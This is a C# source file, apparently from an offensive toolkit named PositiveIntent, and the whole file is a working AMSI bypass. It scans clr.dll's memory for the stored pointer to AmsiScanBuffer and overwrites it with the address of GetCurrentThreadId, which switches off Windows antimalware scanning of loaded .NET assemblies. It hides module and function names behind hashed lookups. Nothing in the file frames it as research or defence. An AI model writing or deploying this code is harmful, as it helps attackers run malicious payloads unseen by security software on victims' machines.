using System;
using System.Runtime.InteropServices;
using PositiveIntent.DINV;
using System.IO;
using System.Reflection;
using System.Diagnostics;

namespace PositiveIntent
{
    public class AMSI
    {
        private static IntPtr FindOffset()
        {
            // Find the address of AmsiScanBuffer in amsi.dll - this will be the pattern searched for in clr.dll to find offset
            IntPtr amsiBaseAddress = Generic.GetLoadedModuleAddress("1C8F3CFDEC271DBD686AEB8093941FC1", 0x123456789); // amsi.dll
            if (amsiBaseAddress == IntPtr.Zero)
            {
                throw new Exception("Failed to find base address of module.");
            }

            IntPtr pAmsiScanBuffer = Generic.GetExportAddress(amsiBaseAddress, "1E6747A9601D28CFB5B9AE9B0559BD89", 0x123456789); // AmsiScanBuffer
            long pattern = pAmsiScanBuffer.ToInt64();

            // Would rather use D/Invoke here for consistency but need full ProcessModule object to easily get size of clr.dll
            ProcessModule clrModule = null;
            foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
            {
                if (module.ModuleName == "clr.dll")
                {
                    clrModule = module;
                    break;
                }
            }

            unsafe
            {
                // Get long pointer to base address of clr.dll
                long* pBaseAddress = (long*)clrModule.BaseAddress.ToPointer();

                // Iterate over clr.dll in 8 byte chunks and compare each chunk with pattern (address of AmsiScanBuffer)
                for (int i = 0; i < (clrModule.ModuleMemorySize / sizeof(long)); i++)
                {
                    long currentValue = pBaseAddress[i];
                    if (currentValue == pattern)
                    {
                        long offset = i * sizeof(long);
                        return new IntPtr(clrModule.BaseAddress.ToInt64() + offset);
                    }
                }
            }
            return IntPtr.Zero;
        }

        public static void Patch()
        {
            // check if on a 64 bit system
            if (IntPtr.Size != 8)
            {
                throw new Exception("32 bit systems are not supported.");
            }

            // Read dummy assembly bytes
            byte[] assemblyBytes = File.ReadAllBytes("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\System.Linq.dll");

            // Load dummy assembly to force the CLR to initialize AMSI
            Assembly assembly = Assembly.Load(assemblyBytes);

            // Create a persistent reference to a type in the assembly to prevent it from being unloaded
            Type enumerableType = assembly.GetType("System.Linq.Enumerable");

            IntPtr pAmsiScanBuffer = FindOffset();
            if (pAmsiScanBuffer == IntPtr.Zero)
            {
                throw new Exception("Failed to find offset.");
            }

            // Get base address of clr.dll & kernel32.dll
            IntPtr clrBaseAddress = Generic.GetLoadedModuleAddress("B0ACD28868EF3BAD632366A915B64319", 0x123456789); // clr.dll
            IntPtr kernel32BaseAddress = Generic.GetLoadedModuleAddress("6B57900FDD9BC3ED1AACC8BB36AF6749", 0x123456789); // kernel32.dll

            // Get pointer to GetCurrentThreadId in kernel32.dll
            IntPtr pGetCurrentThreadId = Generic.GetExportAddress(kernel32BaseAddress, "102AEB13835CC27FE4ABA43DAF66EFD9", 0x123456789); // GetCurrentThreadId

            // Create a byte array from the IntPtr 
            byte[] addressBytes = BitConverter.GetBytes(pGetCurrentThreadId.ToInt64());

            // Overwrite pointer to AmsiScanBuffer in clr.dll's .data section with pointer to GetCurrentThreadId in kernel32.dll
            Marshal.Copy(addressBytes, 0, pAmsiScanBuffer, addressBytes.Length);
        }
    }
}